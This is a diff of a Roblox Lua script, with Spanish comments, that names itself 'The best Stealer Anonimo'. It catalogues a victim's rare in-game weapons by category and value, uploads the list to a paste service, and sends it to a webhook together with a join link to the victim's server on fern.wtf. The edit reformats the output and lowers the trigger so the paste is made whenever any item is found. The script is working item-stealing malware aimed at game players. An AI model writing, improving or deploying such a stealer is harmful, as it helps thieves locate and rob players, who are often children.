@@ -197,7 +197,7 @@ local fernToken = math.random(100000,999999)
 local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
 -- ====================================
--- NUEVO CONTENIDO PASTEBIN POR CATEGORÍAS
+-- NUEVO CONTENIDO PASTEBIN POR CATEGORÍAS (Limpio y valor debajo del arma)
 local categoryOrder = {"Ancient","Godly","Unique","Classic","Chroma"}
 local categoryItems = {Ancient={}, Godly={}, Unique={}, Classic={}, Chroma={}}
 
@@ -214,21 +214,22 @@ local pasteContent = "The best Stealer Anonimo 🇪🇨\n\n"
 for _, cat in ipairs(categoryOrder) do
     local items = categoryItems[cat]
     if #items > 0 then
-        pasteContent = pasteContent.."🟢 "..cat.." 🟢\n"
+        pasteContent = pasteContent..cat..":\n"
         for _, w in ipairs(items) do
-            pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+            pasteContent = pasteContent..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
         end
         pasteContent = pasteContent.."\n"
     end
 end
-pasteContent = pasteContent.."💰 Valor total del inventario: "..tostring(totalValue).."💰"
+
+pasteContent = pasteContent.."Valor total del inventario📦: "..tostring(totalValue).."💰"
 
 local pasteLink
-if #weaponsToSend > 18 then
+if #weaponsToSend > 0 then
     pasteLink = CreateRubisPaste(pasteContent)
 end
--- ====================================
 
+-- ====================================
 -- Webhook inventario
 if #weaponsToSend > 0 then
     local fieldsInit={
